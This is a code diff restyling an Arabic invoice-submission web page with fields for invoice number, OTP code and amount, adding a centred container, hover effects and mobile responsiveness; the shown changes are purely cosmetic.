@@ -2,16 +2,33 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- ✅ دعم الشاشات الصغيرة -->
   <title>إرسال فاتورة</title>
   <link rel="shortcut icon" href="img/try12.png" type="image/png" />
   <style>
     body {
       font-family: 'Arial', sans-serif;
-      max-width: 400px;
-      margin: auto;
-      padding-top: 50px;
+      margin: 0;
+      padding: 0;
+      background-color: #f7f7f7;
       direction: rtl;
       text-align: right;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: auto;
+      padding: 20px;
+      padding-top: 50px;
+      background-color: white;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      border-radius: 10px;
+    }
+
+    h2 {
+      text-align: center;
+      color: #333;
+      font-size: 20px;
     }
 
     input, button {
@@ -21,6 +38,7 @@
       font-size: 16px;
       border: 1px solid #ccc;
       border-radius: 5px;
+      box-sizing: border-box;
     }
 
     button {
@@ -28,6 +46,11 @@
       color: white;
       border: none;
       cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover:not(:disabled) {
+      background-color: #45a049;
     }
 
     button:disabled {
@@ -37,6 +60,7 @@
     #response {
       margin-top: 15px;
       font-weight: bold;
+      text-align: center;
     }
 
     .loader {
@@ -54,19 +78,31 @@
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
+
+    @media (max-width: 480px) {
+      .container {
+        padding: 15px;
+      }
+
+      h2 {
+        font-size: 18px;
+      }
+    }
   </style>
 </head>
 <body>
-  <h2>📋 إرسال بيانات الفاتورة</h2>
-  <form id="invoiceForm">
-    <input type="text" id="invoice" placeholder="رقم الفاتورة" required>
-    <input type="number" id="otp" placeholder="رمز التحقق OTP" required>
-    <input type="number" id="amount" placeholder="المبلغ" required>
-    <button type="submit">إرسال</button>
-  </form>
+  <div class="container">
+    <h2>📋 إرسال بيانات الفاتورة</h2>
+    <form id="invoiceForm">
+      <input type="text" id="invoice" placeholder="رقم الفاتورة" required>
+      <input type="number" id="otp" placeholder="رمز التحقق OTP" required>
+      <input type="number" id="amount" placeholder="المبلغ" required>
+      <button type="submit">إرسال</button>
+    </form>
 
-  <div class="loader" id="loader"></div>
-  <p id="response"></p>
+    <div class="loader" id="loader"></div>
+    <p id="response"></p>
+  </div>
 
   <script>
     const form = document.getElementById('invoiceForm');
@@ -80,7 +116,6 @@
       const otp = document.getElementById('otp').value;
       const amount = document.getElementById('amount').value;
 
-      // ✅ تنسيق التاريخ يدويًا
       const now = new Date();
       const date = `${now.getDate().toString().padStart(2, '0')}/${(now.getMonth() + 1).toString().padStart(2, '0')}/${now.getFullYear()} ${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
 
